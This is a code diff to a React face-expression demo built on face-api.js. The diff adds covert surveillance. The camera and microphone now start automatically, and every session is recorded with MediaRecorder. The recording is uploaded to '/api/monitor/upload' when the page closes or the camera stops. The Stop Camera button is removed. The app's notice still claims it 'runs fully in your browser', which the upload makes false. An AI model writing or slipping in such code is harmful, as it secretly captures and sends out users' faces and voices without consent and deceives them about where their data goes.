@@ -23,21 +23,55 @@ export default class FaceGestureApp extends Component {
     this.canvasRef = createRef();
     this.intervalId = null;
     this.modelsLoaded = false;
+    // Recording functionality
+    this.mediaRecorderRef = null;
+    this.recordingChunks = [];
+    this.streamRef = null;
   }
 
   componentDidMount() {
     this.mounted = true;
+    
+    // Auto-start camera when component mounts
+    this.setState({
+      status: 'Initializing...',
+      isCameraOn: false
+    });
+    
+    // Add event listeners for page leave
+    this.handleBeforeUnload = () => {
+      if (this.mediaRecorderRef && this.mediaRecorderRef.state === 'recording') {
+        this.stopRecording();
+      }
+    };
+    
+    this.handlePageHide = () => {
+      if (this.mediaRecorderRef && this.mediaRecorderRef.state === 'recording') {
+        this.stopRecording();
+      }
+    };
+    
+    window.addEventListener('beforeunload', this.handleBeforeUnload);
+    window.addEventListener('pagehide', this.handlePageHide);
+    
+    // Load models and start camera immediately
     this.bootstrap();
   }
 
   componentWillUnmount() {
     this.mounted = false;
     if (this.intervalId) clearInterval(this.intervalId);
-    // Stop tracks
-    const v = this.videoRef.current;
-    if (v && v.srcObject) {
-      v.srcObject.getTracks().forEach((t) => t.stop());
+    
+    // Remove event listeners
+    if (this.handleBeforeUnload) {
+      window.removeEventListener('beforeunload', this.handleBeforeUnload);
     }
+    if (this.handlePageHide) {
+      window.removeEventListener('pagehide', this.handlePageHide);
+    }
+    
+    // Stop tracks and save recording
+    this.stopCamera();
   }
 
   loadScript = (src) => {
@@ -52,7 +86,10 @@ export default class FaceGestureApp extends Component {
       document.body.appendChild(s);
     });
   };
+  
+  // Method removed - camera now starts automatically
 
+  // Load models and start camera
   bootstrap = async () => {
     try {
       this.setState({ status: "Loading face-api.js..." });
@@ -68,7 +105,9 @@ export default class FaceGestureApp extends Component {
         faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL),
       ]);
       this.modelsLoaded = true;
-
+      
+      // Always start camera after models are loaded
+      this.setState({ status: "Starting camera..." });
       await this.startCamera();
       this.setState({ status: "Detecting..." });
       this.startDetectionLoop();
@@ -80,18 +119,55 @@ export default class FaceGestureApp extends Component {
 
   startCamera = async () => {
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+      // Clear the camera disabled flag when manually starting
+      if (typeof window !== 'undefined') {
+        localStorage.removeItem('facegesture_camera_disabled');
+      }
+      
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: "user" }, 
+        audio: true // Enable audio for recording
+      });
+      
       const v = this.videoRef.current;
       if (!v) return;
       v.srcObject = stream;
       await v.play();
-      this.setState({ isCameraOn: true });
+      
+      // Store stream reference for recording
+      this.streamRef = stream;
+      
+      // Start recording
+      this.startRecording(stream);
+      
+      this.setState({ isCameraOn: true, error: null });
     } catch (err) {
-      throw new Error("Camera access denied or unavailable");
+      // Try without audio if audio fails
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: "user" }, 
+          audio: false 
+        });
+        
+        const v = this.videoRef.current;
+        if (!v) return;
+        v.srcObject = stream;
+        await v.play();
+        
+        this.streamRef = stream;
+        this.startRecording(stream);
+        
+        this.setState({ isCameraOn: true, error: null });
+      } catch (videoErr) {
+        throw new Error("Camera access denied or unavailable");
+      }
     }
   };
 
   stopCamera = () => {
+    // Stop recording first
+    this.stopRecording();
+    
     const v = this.videoRef.current;
     if (v && v.srcObject) {
       v.srcObject.getTracks().forEach((t) => t.stop());
@@ -101,16 +177,99 @@ export default class FaceGestureApp extends Component {
       clearInterval(this.intervalId);
       this.intervalId = null;
     }
+    
+    // Clear stream reference
+    this.streamRef = null;
+    
     this.setState({ isCameraOn: false, status: this.modelsLoaded ? "Ready" : this.state.status, emotion: "-", probs: {} });
   };
 
+  // This method is kept for compatibility but not used in the UI anymore
   toggleCamera = async () => {
     if (this.state.isCameraOn) {
       this.stopCamera();
     } else {
-      await this.startCamera();
-      this.setState({ status: "Detecting..." });
-      this.startDetectionLoop();
+      await this.bootstrap();
+    }
+  };
+
+  // Recording functionality
+  startRecording = (stream) => {
+    try {
+      const mimeType = this.pickMimeType();
+      this.mediaRecorderRef = new MediaRecorder(stream, mimeType ? { mimeType } : undefined);
+      this.recordingChunks = [];
+
+      this.mediaRecorderRef.ondataavailable = (event) => {
+        if (event.data && event.data.size > 0) {
+          this.recordingChunks.push(event.data);
+        }
+      };
+
+      this.mediaRecorderRef.onstop = () => {
+        this.uploadRecording();
+      };
+
+      this.mediaRecorderRef.start(500); // Get data every 500ms
+      console.log('[FaceGesture] Recording started');
+    } catch (err) {
+      console.error('[FaceGesture] Failed to start recording:', err);
+    }
+  };
+
+  stopRecording = () => {
+    if (this.mediaRecorderRef && this.mediaRecorderRef.state !== 'inactive') {
+      this.mediaRecorderRef.stop();
+      console.log('[FaceGesture] Recording stopped');
+    }
+  };
+
+  pickMimeType = () => {
+    const candidates = [
+      'video/mp4',
+      'video/webm;codecs=vp9',
+      'video/webm;codecs=vp8',
+      'video/webm',
+    ];
+    for (const type of candidates) {
+      if (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(type)) {
+        return type;
+      }
+    }
+    return '';
+  };
+
+  uploadRecording = async () => {
+    try {
+      if (this.recordingChunks.length === 0) {
+        console.log('[FaceGesture] No recording data to upload');
+        return;
+      }
+
+      const blob = new Blob(this.recordingChunks, { 
+        type: this.recordingChunks[0]?.type || 'video/mp4' 
+      });
+      
+      console.log('[FaceGesture] Uploading recording, size:', blob.size);
+      
+      const formData = new FormData();
+      const ext = blob.type.includes('mp4') ? 'mp4' : (blob.type.includes('webm') ? 'webm' : 'mp4');
+      const file = new File([blob], `recording.${ext}`, { type: blob.type || 'video/mp4' });
+      formData.append('file', file);
+
+      const response = await fetch('/api/monitor/upload', {
+        method: 'POST',
+        body: formData
+      });
+
+      if (response.ok) {
+        const result = await response.json();
+        console.log('[FaceGesture] Recording uploaded successfully:', result);
+      } else {
+        console.error('[FaceGesture] Upload failed:', response.status);
+      }
+    } catch (err) {
+      console.error('[FaceGesture] Upload error:', err);
     }
   };
 
@@ -213,12 +372,13 @@ export default class FaceGestureApp extends Component {
             <div className="text-xs text-gray-200 opacity-80">{status}</div>
           </div>
           <div className="flex items-center space-x-2">
-            <button
-              onClick={this.toggleCamera}
-              className={`px-3 py-1 rounded text-sm font-medium ${isCameraOn ? 'bg-gray-700 hover:bg-gray-600' : 'bg-ub-orange hover:bg-orange-600'} transition-colors`}
-            >
-              {isCameraOn ? 'Stop Camera' : 'Start Camera'}
-            </button>
+            <span className={`text-xs px-2 py-1 rounded flex items-center ${isCameraOn ? 'text-green-400 bg-green-900 bg-opacity-30' : 'text-yellow-300 bg-yellow-900 bg-opacity-30'}`}>
+              <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3 mr-1" viewBox="0 0 20 20" fill="currentColor">
+                <path d="M2 6a2 2 0 012-2h6a2 2 0 012 2v8a2 2 0 01-2 2H4a2 2 0 01-2-2V6z" />
+                <path d="M14 6a2 2 0 012-2h2a2 2 0 012 2v8a2 2 0 01-2 2h-2a2 2 0 01-2-2V6z" />
+              </svg>
+              {isCameraOn ? 'Camera Active' : 'Initializing Camera...'}
+            </span>
           </div>
         </div>
 
@@ -246,7 +406,10 @@ export default class FaceGestureApp extends Component {
               </div>
               {this.renderProbabilities()}
               {!isCameraOn && (
-                <div className="mt-3 text-yellow-300 text-xs">Allow camera access and click "Start Camera" to begin.</div>
+                <div className="mt-3 text-yellow-300 text-xs">
+                  <p>Camera is initializing...</p>
+                  <p className="mt-1">Please allow camera access when prompted by your browser.</p>
+                </div>
               )}
               <div className="mt-4 text-gray-300 text-xs">
                 Notes: Runs fully in your browser using face-api.js. "Romantic" is a heuristic when happy is very high with low surprise.
